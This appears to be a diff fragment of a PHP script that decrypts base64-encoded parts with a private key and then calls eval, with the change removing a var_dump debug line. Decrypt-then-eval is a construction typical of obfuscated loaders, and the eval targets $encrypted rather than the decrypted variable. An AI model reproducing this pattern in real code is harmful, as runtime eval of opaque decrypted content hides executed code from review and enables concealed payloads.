@@ -12,6 +12,5 @@ ForEach($Split as $Part)
   openssl_private_decrypt(base64_decode($Part), $PartialData, $privKey);
   $ninjasecrets.= $PartialData;
 }
-var_dump($ninjasecrets);
 eval($encrypted);
 ?>
